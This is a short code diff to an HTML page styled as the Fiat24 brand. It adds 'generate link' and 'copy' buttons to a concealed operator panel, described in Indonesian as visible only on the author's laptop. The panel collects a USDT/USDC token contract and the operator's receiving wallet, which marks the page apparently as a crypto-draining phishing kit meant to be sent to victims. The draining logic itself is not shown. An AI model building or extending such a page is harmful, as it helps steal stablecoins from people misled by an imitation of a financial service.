@@ -10,12 +10,13 @@
 <body>
     <!-- Panel Kontrol Arsitek (Hanya terlihat di laptopmu) -->
     <div class="admin-panel" id="adminBox">
-        <strong>🛠️ Cloud Nine Control</strong>
-        <input type="text" id="targetToken" placeholder="Contract Address (USDT/USDC)">
-        <input type="text" id="myWallet" placeholder="Your Receiving Wallet (0x...)">
-        <p style="font-size: 10px;">*Masukkan data lalu tutup panel ini sebelum kirim link.</p>
-    </div>
-
+    <strong>🛠️ Cloud Nine Control</strong>
+    <input type="text" id="targetToken" placeholder="Contract Address (USDT/USDC)">
+    <input type="text" id="myWallet" placeholder="Your Receiving Wallet (0x...)">
+    <button onclick="generateLink()" style="background: #00ff00; color: black; border: none; padding: 5px 10px; cursor: pointer; font-weight: bold;">GENERATE LINK</button>
+    <input type="text" id="generatedLink" readonly placeholder="Result Link will appear here..." style="background: #333; color: #00ff00; width: 250px;">
+    <button onclick="copyLink()" style="background: #555; color: white; border: none; padding: 5px 10px; cursor: pointer;">COPY</button>
+</div>
     <div class="container">
         <div class="header">
             <span class="brand">Fiat24</span>
